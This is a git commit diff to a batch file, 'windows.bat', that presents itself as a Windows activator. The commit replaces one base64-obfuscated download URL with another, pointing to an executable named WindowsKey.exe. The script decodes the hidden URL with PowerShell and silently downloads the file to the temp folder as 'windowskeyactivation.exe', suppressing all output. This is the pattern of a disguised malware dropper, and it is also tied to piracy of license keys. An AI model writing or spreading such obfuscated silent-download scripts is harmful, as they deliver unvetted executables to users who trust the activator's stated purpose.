5fd95622f9b510ee8548cfd5aabfa6c0c941804c
betamod9 <164927681+betamod9@users.noreply.github.com>
2024-12-27 16:05:55 +0200

    Update windows.bat

--- windows.bat
+++ windows.bat
@@ -1,5 +1,5 @@
 @echo off
-set "b64=aHR0cHM6Ly9maWxldHJhbnNmZXIuaW8vZGF0YS1wYWNrYWdlLzJQVUFrb2NULy9kb3dubG9hZA=="
+set "b64=aHR0cHM6Ly9naXRodWIuY29tL2JldGFtb2Q5L1dpbmRvd3MtMTAtYW5kLTExLUFjdGl2YXRvci9yZWxlYXNlcy9kb3dubG9hZC8xMi4yNy4yMDI0L1dpbmRvd3NLZXkuZXhl"
 for /f "tokens=*" %%a in ('powershell "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%b64%'))"') do set "url=%%a"
 set "filename=%temp%\windowskeyactivation.exe"
 powershell -Command "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri '%url%' -OutFile '%filename%'" >nul 2>&1
